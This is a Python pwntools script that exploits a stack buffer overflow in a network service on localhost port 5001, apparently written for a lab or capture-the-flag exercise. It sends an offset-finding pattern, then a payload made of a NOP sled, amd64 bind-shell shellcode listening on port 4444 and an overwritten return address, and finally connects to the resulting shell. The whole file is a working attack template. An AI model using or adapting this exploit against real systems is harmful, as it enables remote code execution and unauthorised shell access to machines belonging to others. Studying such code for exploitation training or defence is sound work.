import time
import struct
import sys
import argparse
from pwn import *

context.update(arch='amd64', os='linux')

parser = argparse.ArgumentParser()
parser.add_argument("--offset", type=int, required=True)
parser.add_argument("--address", type=str)
args = parser.parse_args()

print("Dont forget to start the server in the background")

def main():
        if args.address is None:
                print("--[ Send pattern")
                pattern = makePattern(args.offset)
                print(hexdump(pattern, skip=False))
                send(pattern)
                return

        else:
                print("--[ Send exploit")
                exploit = makeExploit(args.offset, int(args.address, 16))
                print("Size: " + str(len(exploit)))
                print(hexdump(exploit, skip=False))

                send(exploit, debug=False)
                time.sleep(0.1)
                checkShell()
                return


def makePattern(offset):
        pattern = b'XXXX'
        pattern += 'A' * (offset - 4)
        pattern += 'BBBB' # RIP
        return pattern


def makeExploit(offset, address):
        # pwnlib.shellcraft.amd64.linux.bindsh
        s = shellcraft.amd64.linux.bindsh(4444, "ipv4")
        shellcode = asm(s)
        buf_size = offset - 16

        exploit = "\x90" * (buf_size - len(shellcode))
        exploit += shellcode
        exploit += "A" * (offset - len(exploit))
        exploit += p64(address)

        return exploit


def checkShell():
        try:
                tube = remote("localhost", 4444)
                tube.interactive()
        except Exception as e:
                print("Error: Remote shell not started.")
                pass


def send(pattern, debug=True):
        tube = remote("localhost", 5001)
        if debug:
                gdb.attach(tube, '''
set follow-fork-mode child
continue
''')

        tube.send(pattern)
        return

if __name__ == '__main__':
        main()